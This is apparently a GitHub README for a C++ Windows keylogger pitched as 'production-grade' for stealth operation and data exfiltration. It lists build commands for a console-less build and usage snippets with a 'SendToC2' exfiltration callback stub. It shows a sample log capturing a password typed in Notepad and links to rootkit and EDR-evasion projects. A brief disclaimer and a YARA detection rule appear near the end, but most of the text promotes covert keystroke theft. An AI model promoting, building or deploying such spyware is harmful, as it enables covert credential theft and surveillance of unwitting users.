# Stealth Keylogger

![Version](https://img.shields.io/badge/version-3.0-blue.svg)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)
![Language](https://img.shields.io/badge/language-C++-red.svg)

Production-grade Windows keylogger with advanced features for stealth operation and data exfiltration.

## 🎯 Features

### Core Functionality
- **Low-Level Keyboard Hook** (`WH_KEYBOARD_LL`) - System-wide keystroke capture
- **Mouse Hook Integration** - Right-click detection for instant buffer flush
- **Unicode Character Support** - Accurate capture of accents, symbols, and international characters
- **Window Tracking** - Automatic detection of active window and process name
- **Timestamp Logging** - Session tracking with precise timestamps

### Security & Stealth
- **Thread-Safe Buffer** - Mutex-protected keystroke buffer for reliability
- **Random Filename** - Generates random `.tmp` filenames in temp directory
- **Morphological Capture** - Sends data on ENTER key or right-click (natural behavior)
- **Stealth Mode** - No visible console window when compiled with `-mwindows`

### Data Exfiltration
- **File Logging** - UTF-8 encoded log files with session headers
- **Callback Support** - Custom callback function for network exfiltration
- **Exponential Backoff** - Automatic retry with exponential backoff (100ms, 200ms, 400ms)
- **Buffer Flush** - Graceful shutdown with buffer flush to prevent data loss

## 📋 Requirements

- **OS**: Windows 7/8/10/11 (x64)
- **Compiler**: MinGW-w64 GCC or MSVC
- **Privileges**: Standard user (no admin required)

## 🔧 Compilation

### Debug Build (with console)
```bash
g++ -o keylogger.exe main.cpp -static -std=c++17
```

### Production Build (no console)
```bash
g++ -o keylogger.exe main.cpp -mwindows -static -std=c++17 -O2
```

### With Custom Icon (optional)
```bash
windres icon.rc -o icon.o
g++ -o keylogger.exe main.cpp icon.o -mwindows -static -std=c++17 -O2
```

## 🚀 Usage

### Basic Usage
```cpp
#include "Keylogger.h"

// Start keylogger with file logging
Keylogger::Start(nullptr, true);

// Message loop
MSG msg;
while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}

// Stop keylogger
Keylogger::Stop();
```

### With Network Exfiltration
```cpp
void SendToC2(const wstring& data) {
    // Implement your C2 communication here
    // Example: HTTP POST to remote server
}

// Start with callback
Keylogger::Start(SendToC2, true);
```

### Custom Log Path
```cpp
// Use custom log file location
Keylogger::SetLogFilePath(L"C:\\Logs\\keylog.txt");
Keylogger::EnableFileLogging(true);
Keylogger::Start();
```

## 📊 Log Format

```
========================================
Session Started
Date: 2025-12-24 12:30:45
========================================

[2025-12-24 12:30:50] Window: Google Chrome [chrome.exe]
Hello World[ENTER]

[2025-12-24 12:31:02] Window: Notepad [notepad.exe]
password123[ENTER]

========================================
Session Ended
Date: 2025-12-24 12:35:10
========================================
```

## 🔑 Key Features Explained

### Morphological Keylogging
The keylogger waits for natural trigger events (ENTER key or right-click) before sending data, making it harder to detect compared to traditional timed-based keyloggers.

### Unicode Support
Uses `ToUnicodeEx()` with keyboard layout detection to accurately capture:
- Accented characters (é, à, ü, etc.)
- Special symbols (@, €, £, etc.)
- Dead keys and AltGr combinations

### Window Tracking
Automatically detects window changes and logs:
- Window title
- Process name
- Timestamp of window switch

### Thread Safety
All buffer operations are protected with mutex synchronization to prevent race conditions in multi-threaded environments.

## ⚠️ Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

This software is designed for:
- Security research and penetration testing
- Red team operations with proper authorization
- Educational purposes in controlled environments

**Unauthorized use of this software is illegal.** The author assumes no liability for misuse or damage caused by this software. Always obtain explicit written permission before deploying on any system you do not own.

## 📜 License

Copyright (c) 2025 - 28zaakypro@proton.me

This project is for educational purposes only. Use responsibly and ethically.

## 🛡️ Detection & Defense

### YARA Rule Example
```yara
rule Stealth_Keylogger {
    strings:
        $hook1 = "SetWindowsHookExW" ascii wide
        $hook2 = "WH_KEYBOARD_LL" ascii wide
        $hook3 = "GetAsyncKeyState" ascii wide
    condition:
        2 of them
}
```

### Detection Methods
- Monitor for `SetWindowsHookEx` API calls
- Check for unusual keyboard/mouse hook registrations
- Analyze network traffic for keystroke exfiltration patterns
- Inspect temp directory for suspicious `.tmp` files

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:
1. Fork the repository
2. Create a feature branch
3. Test thoroughly on multiple Windows versions
4. Submit pull request with detailed description

## 📧 Contact

- GitHub: [@28Zaaky](https://github.com/28Zaaky)
- Email: 28zaakypro@proton.me

## 🔗 Related Projects

- [Rootkit-Usermode](https://github.com/28Zaaky/Rootkit-Usermode) - Full-featured Windows rootkit with C2
- [EDR-Evasion](https://github.com/28Zaaky/EDR-Evasion) - EDR bypass techniques

---

**Remember:** With great power comes great responsibility. Use ethically. 🔒
